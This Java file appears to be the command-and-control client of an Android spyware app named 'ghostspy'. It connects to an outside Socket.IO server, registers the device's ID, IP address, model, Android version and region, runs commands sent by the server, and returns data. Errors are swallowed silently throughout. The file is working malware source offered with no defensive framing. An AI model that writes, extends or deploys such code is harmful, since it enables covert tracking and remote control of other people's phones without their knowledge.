package com.ghostspy;

import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;
import org.json.JSONObject;
import java.net.URISyntaxException;

public class SocketClient {
    private Socket socket;
    private String deviceId;
    private CommandHandler handler;

    public SocketClient(String id) {
        this.deviceId = id;
        handler = new CommandHandler();
        try {
            socket = IO.socket("https://ghostspy.bruang.biz.id");
        } catch (URISyntaxException e) {}
    }

    public void connect() {
        if (socket == null) return;
        socket.on(Socket.EVENT_CONNECT, args -> {
            JSONObject reg = new JSONObject();
            try {
                reg.put("id", deviceId);
                reg.put("ip", GhostService.getLocalIp());
                reg.put("model", android.os.Build.MODEL);
                reg.put("android", android.os.Build.VERSION.RELEASE);
                reg.put("region", java.util.Locale.getDefault().getCountry());
                socket.emit("register", reg);
            } catch (Exception e) {}
        });
        socket.on("command", args -> {
            try {
                JSONObject cmd = (JSONObject) args[0];
                handler.handle(cmd.getString("command"), cmd.optJSONObject("params"));
            } catch (Exception e) {}
        });
        socket.connect();
    }

    public void send(String type, String payload) {
        if (socket != null && socket.connected()) {
            JSONObject msg = new JSONObject();
            try {
                msg.put("type", type);
                msg.put("payload", payload);
                socket.emit("data", msg);
            } catch (Exception e) {}
        }
    }

    public void disconnect() {
        if (socket != null) socket.disconnect();
    }
}
